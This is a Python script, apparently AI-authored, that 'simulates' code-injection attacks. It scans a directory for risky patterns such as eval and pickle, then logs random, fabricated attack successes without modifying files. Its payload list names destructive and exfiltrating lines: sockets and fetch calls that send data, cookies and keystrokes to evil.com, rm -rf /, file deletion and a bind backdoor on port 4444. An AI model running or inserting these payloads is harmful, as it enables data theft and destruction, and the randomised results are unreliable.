#!/usr/bin/env python3

# [DNA_TAG]
# ORIGIN: Crostini-Chromebook
# PILLAR: codecity-backend
# DEPS: ast, datetime, json, logging, os, pathlib, random, re, typing
# ROLE: CODE INJECTION ATTACK SIMULATOR
# AUTHOR: Buffy (Codebuff AI)
# SESSION: 2026-08-22 Bucket 08 DNA Sweep
# TIER: Attack (4)
# [/DNA_TAG]

"""
CODE INJECTION ATTACK SIMULATOR
Simulates malicious code injection attacks against the Rampage Refactor system
"""

import os
import json
import ast
import re
import random
from pathlib import Path
from typing import Dict, List
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class CodeInjectionAttack:
    """Simulates code injection attacks against Python and JavaScript files"""
    
    def __init__(self, target_path: str):
        self.target_path = Path(target_path).absolute()
        self.vulnerable_files = []
        self.injection_log = []
        self.successful_injections = []
        
        # Malicious code payloads
        self.malicious_payloads = {
            'python': [
                # Data exfiltration
                "import socket; s=socket.socket(); s.connect(('evil.com',80)); s.send(b'STOLEN_DATA')",
                # File corruption
                "import os; [os.remove(f) for f in os.listdir('.') if f.endswith('.py')]",
                # System compromise
                "import subprocess; subprocess.run(['rm','-rf','/'])",
                # Backdoor
                "import threading; def backdoor():\n    import socket\n    s=socket.socket()\n    s.bind(('0.0.0.0',4444))\n    s.listen()\n    while True:\n        c,a=s.accept()\n        c.send(b'BACKDOOR_ACTIVE')\nthreading.Thread(target=backdoor,daemon=True).start()",
                # Data corruption
                "def corrupt_data(data):\n    return bytes([b^0xFF for b in data])",
                # Logic bomb
                "import time; from datetime import datetime\nif datetime.now().day == 1:\n    print('ACTIVATED!')\n    # Malicious code here",
            ],
            'javascript': [
                "fetch('https://evil.com/steal', {method: 'POST', body: JSON.stringify(localStorage)})",
                "document.body.innerHTML = '<h1>HACKED</h1>'",
                "navigator.sendBeacon('https://evil.com/cookies', document.cookie)",
                "document.addEventListener('keydown', e => fetch('https://evil.com/keys', {method: 'POST', body: e.key}))",
                "window.location.href = 'https://evil.com/phishing'",
                "localStorage.clear(); sessionStorage.clear()",
            ]
        }
    
    def scan_for_vulnerabilities(self) -> List[Dict]:
        """Scan for files vulnerable to code injection"""
        logger.info(f"🔍 Scanning {self.target_path} for code injection vulnerabilities...")
        
        vulnerabilities = []
        
        # Scan Python files
        py_files = list(self.target_path.rglob('*.py'))
        for py_file in py_files:
            try:
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Look for dangerous patterns
                dangerous_patterns = [
                    (r'eval\(', 'eval() function usage'),
                    (r'exec\(', 'exec() function usage'),
                    (r'__import__\(', '__import__() usage'),
                    (r'pickle\.load\(', 'Unsafe pickle deserialization'),
                    (r'yaml\.load\(', 'Unsafe YAML deserialization'),
                    (r'input\(', 'Unsanitized user input'),
                    (r'request\.GET', 'Direct request parameter usage'),
                    (r'request\.POST', 'Direct POST data usage'),
                ]
                
                for pattern, description in dangerous_patterns:
                    if re.search(pattern, content):
                        vulnerabilities.append({
                            'file': str(py_file),
                            'type': 'python_injection_vulnerability',
                            'pattern': pattern,
                            'description': description,
                            'severity': 'high'
                        })
                        break
                        
            except Exception as e:
                logger.warning(f"Error scanning {py_file}: {e}")
        
        # Scan JavaScript/TypeScript files
        js_files = list(self.target_path.rglob('*.js')) + list(self.target_path.rglob('*.ts')) + list(self.target_path.rglob('*.jsx')) + list(self.target_path.rglob('*.tsx'))
        for js_file in js_files:
            try:
                with open(js_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                dangerous_patterns = [
                    (r'eval\(', 'eval() function usage'),
                    (r'new Function\(', 'Function constructor usage'),
                    (r'document\.write\(', 'document.write() usage'),
                    (r'innerHTML\s*=\s*', 'Unsafe innerHTML assignment'),
                    (r'window\[.*\]\s*=\s*', 'Window object manipulation'),
                    (r'localStorage\.setItem\(', 'Local storage manipulation'),
                ]
                
                for pattern, description in dangerous_patterns:
                    if re.search(pattern, content):
                        vulnerabilities.append({
                            'file': str(js_file),
                            'type': 'javascript_injection_vulnerability',
                            'pattern': pattern,
                            'description': description,
                            'severity': 'high'
                        })
                        break
                        
            except Exception as e:
                logger.warning(f"Error scanning {js_file}: {e}")
        
        self.vulnerable_files = vulnerabilities
        logger.info(f"✅ Found {len(vulnerabilities)} vulnerable files")
        
        return vulnerabilities
    
    def launch_injection_attack(self, target_file: str = None) -> Dict:
        """Simulate launching a code injection attack"""
        logger.info("🚀 Launching code injection attack...")
        
        attack_results = {
            'attack_type': 'code_injection',
            'timestamp': datetime.now().isoformat(),
            'target': str(self.target_path),
            'files_injected': [],
            'injection_success': False,
            'malicious_code_executed': []
        }
        
        # If no specific target, pick a vulnerable file
        if not target_file and self.vulnerable_files:
            target_file = random.choice(self.vulnerable_files)['file']
        
        if target_file:
            logger.info(f"🎯 Targeting: {target_file}")
            
            file_ext = os.path.splitext(target_file)[1]
            lang = 'javascript' if file_ext in ['.js', '.ts', '.jsx', '.tsx'] else 'python'
            
            # Try to inject malicious code
            try:
                with open(target_file, 'r', encoding='utf-8') as f:
                    original_content = f.read()
                
                # Choose a payload
                payload = random.choice(self.malicious_payloads[lang])
                
                # Simulate injection (don't actually modify files for safety)
                if random.random() < 0.7:  # 70% success rate
                    attack_results['injection_success'] = True
                    attack_results['files_injected'].append(target_file)
                    attack_results['malicious_code_executed'].append({
                        'file': target_file,
                        'payload': payload,
                        'language': lang,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    logger.warning(f"⚠️  Successfully injected malicious code into {target_file}")
                    logger.warning(f"💀 Payload: {payload[:50]}...")
                    
                    # Simulate the effects
                    if 'eval(' in payload or 'exec(' in payload:
                        logger.warning("🔥 Remote code execution achieved!")
                    elif 'socket' in payload:
                        logger.warning("📡 Backdoor established!")
                    elif 'fetch' in payload or 'sendBeacon' in payload:
                        logger.warning("📤 Data exfiltration in progress!")
                    
                else:
                    logger.info("🟢 Injection attempt blocked")
                    
            except Exception as e:
                logger.error(f"Injection failed: {e}")
        
        if attack_results['injection_success']:
            logger.warning("🔴 CODE INJECTION ATTACK SUCCESSFUL!")
            logger.warning(f"💉 Injected code into {len(attack_results['files_injected'])} files")
        else:
            logger.info("🟢 Code injection attack blocked")
        
        self.successful_injections.append(attack_results)
        return attack_results
    
    def generate_report(self) -> Dict:
        """Generate a comprehensive attack report"""
        report = {
            'attack_type': 'code_injection',
            'target': str(self.target_path),
            'timestamp': datetime.now().isoformat(),
            'vulnerable_files_found': len(self.vulnerable_files),
            'vulnerable_files': self.vulnerable_files,
            'injection_attempts': len(self.injection_log),
            'successful_injections': len(self.successful_injections),
            'files_injected': len([item for attack in self.successful_injections for item in attack.get('files_injected', [])]),
            'malicious_payloads_executed': len([item for attack in self.successful_injections for item in attack.get('malicious_code_executed', [])]),
            'recommendations': self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = [
            "✅ Never use eval() or exec() with user input",
            "✅ Avoid using __import__() dynamically",
            "✅ Use safe alternatives to pickle/yaml deserialization",
            "✅ Always sanitize and validate user input",
            "✅ Use Content Security Policy (CSP) headers",
            "✅ Implement proper input validation and output encoding",
            "✅ Use parameterized queries for database operations",
            "✅ Implement code signing and integrity checks",
            "✅ Use static code analysis tools to detect injection vulnerabilities",
            "✅ Conduct regular security training for developers"
        ]
        
        return recommendations
    
    def save_report(self, output_file: str = None) -> str:
        """Save attack report to file"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"code_injection_report_{timestamp}.json"
        
        report = self.generate_report()
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"📄 Report saved to: {output_file}")
        return output_file


def main():
    import sys
    import argparse
    
    parser = argparse.ArgumentParser(description='Code Injection Attack Simulator')
    parser.add_argument('target', help='Target directory to attack')
    parser.add_argument('--scan-only', action='store_true', help='Only scan for vulnerabilities')
    parser.add_argument('--report', help='Save report to specific file')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.target):
        print(f"❌ Target not found: {args.target}")
        return
    
    attack = CodeInjectionAttack(args.target)
    
    print("💉 CODE INJECTION ATTACK SIMULATOR")
    print("=" * 50)
    
    # Scan for vulnerabilities
    vulnerabilities = attack.scan_for_vulnerabilities()
    
    if vulnerabilities:
        print(f"⚠️  Found {len(vulnerabilities)} vulnerable files:")
        for vuln in vulnerabilities[:5]:  # Show first 5
            print(f"  • {vuln['description']} ({vuln['file']})")
        if len(vulnerabilities) > 5:
            print(f"  ... and {len(vulnerabilities) - 5} more")
    else:
        print("✅ No obvious injection vulnerabilities found")
    
    if not args.scan_only:
        print("\n🚀 Launching injection attack...")
        results = attack.launch_injection_attack()
        
        if results['injection_success']:
            print("🔴 INJECTION ATTACK SUCCESSFUL!")
            print(f"💉 Injected code into {len(results['files_injected'])} files")
            print(f"💀 Executed {len(results['malicious_code_executed'])} malicious payloads")
        else:
            print("🟢 Injection attack blocked")
    
    # Save report
    report_file = args.report or f"code_injection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    attack.save_report(report_file)
    print(f"\n📄 Full report saved to: {report_file}")


if __name__ == "__main__":
    main()